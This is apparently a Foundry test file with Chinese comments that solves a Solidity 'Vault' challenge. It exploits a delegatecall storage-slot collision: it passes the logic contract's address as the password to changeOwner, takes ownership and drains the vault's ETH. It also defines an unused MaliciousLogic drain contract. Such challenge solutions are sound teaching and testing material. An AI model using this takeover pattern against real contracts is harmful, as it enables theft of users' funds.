// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import "../src/Vault.sol";

// 攻击合约，用于替换原始的 VaultLogic
contract MaliciousLogic {
    function withdraw() external {
        // 将合约中的所有 ETH 转给调用者
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // 攻击步骤：
        // 1. 先存入一些资金以便后续提取
        vault.deposite{value: 0.01 ether}();
        
        // 2. 通过 delegatecall 调用 VaultLogic 的 changeOwner 函数
        // 由于存储槽冲突，VaultLogic 的 password 在 slot 1，对应 Vault 的 logic 变量
        // 我们需要传入正确的密码，但是 Vault 的 slot 1 存储的是 logic 合约地址
        // 所以我们需要传入 logic 合约地址作为密码
        bytes32 logicAddress = bytes32(uint256(uint160(address(logic))));
        bytes memory data = abi.encodeWithSignature("changeOwner(bytes32,address)", logicAddress, palyer);
        (bool success,) = address(vault).call(data);
        require(success, "changeOwner failed");
        
        // 3. 现在 palyer 是 owner，可以调用 openWithdraw
        vault.openWithdraw();
        
        // 4. 调用 withdraw 提取所有资金（包括原有的 0.1 ether 和我们存入的 0.01 ether）
        vault.withdraw();
        
        // 5. 提取原 owner 的资金
        vm.stopPrank();
        vm.startPrank(owner);
        vault.withdraw();
        vm.stopPrank();
        
        // 6. 切换回 palyer 继续提取
        vm.startPrank(palyer);
        vault.withdraw();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}